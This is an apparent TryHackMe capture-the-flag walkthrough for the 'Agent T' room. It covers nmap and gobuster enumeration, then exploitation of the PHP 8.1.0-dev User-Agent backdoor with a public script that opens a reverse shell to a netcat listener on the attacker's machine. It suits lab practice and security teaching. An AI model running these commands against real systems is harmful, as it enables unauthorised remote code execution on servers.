@@ -1,0 +1,102 @@
+Agent T - TryHackMe Walkthrough
+Room: Agent T (Challenge)
+Difficulty: Easy
+Focus: PHP 8.1.0-dev RCE, Enumeration, Privilege Escalation
+Author: D3adshot
+Date: 20 May 2025
+
+
+First Things First
+
+Recon & Enumeration:
+
+Ran a full Nmap scan on the target:
+
+nmap -sC -sV  <target IP>
+
+Open ports:
+
+    22 (SSH)
+
+    80 (HTTP)
+
+On visiting the website, I found a basic "Agent Portal" (Dashboard if you will) login page. I ran a directory brute-force using gobuster and found /info.php. That revealed the PHP version running: PHP 8.1.0-dev.
+
+gobuster dir -u http://<target i.p> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gobuster.txt
+
+Exploitation:
+
+PHP 8.1.0-dev has a known backdoor from March 2021, where code can be executed via the User-Agent header.
+
+I downloaded the exploit from Exploit-DB (ID 49933):
+
+https://www.exploit-db.com/exploits/49933
+
+Then cloned the exploit:
+
+git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce.git
+
+....cd into directory...
+
+cd php-8.1.0-dev-backdoor-rce
+
+Started a netcat listener on a separate terminal:
+
+nc -lvnp 4444
+
+
+STOP!!! Did you start the Netcat listener on port 4444 ????
+
+
+Run the Python exploit:
+
+Make sure you have Python3
+
+python3 --version
+
+Run:
+
+python3 revshell_php_8.1.0-dev.py http://10.10.X.X 10.8.X.X 4444
+
+IP	Belongs To:
+10.10.X.X	Target (TryHackMe Viln Machine)
+10.8.X.X	Attacker (Your Attacking Machine)
+
+This gave me a reverse shell as www-data on my listener.
+
+Privilege Escalation:
+
+I looked for the flag (on the listening terminal)
+
+find / -name flag.txt 2>/dev/null
+
+Found it at:
+/flag.txt
+
+Read the flag:
+
+cat /flag.txt
+
+Paste the flag in the challenge answer.
+
+
+
+Tools Used:
+
+    Nmap
+
+    Gobuster
+
+    Netcat
+
+    Python
+
+    Exploit-DB
+
+Lessons Learned:
+
+    Exposing dev versions like PHP 8.1.0-dev in production is dangerous.
+
+    PHPinfo pages can leak sensitive version data.
+
+    Always test custom headers like User-Agent for RCE.
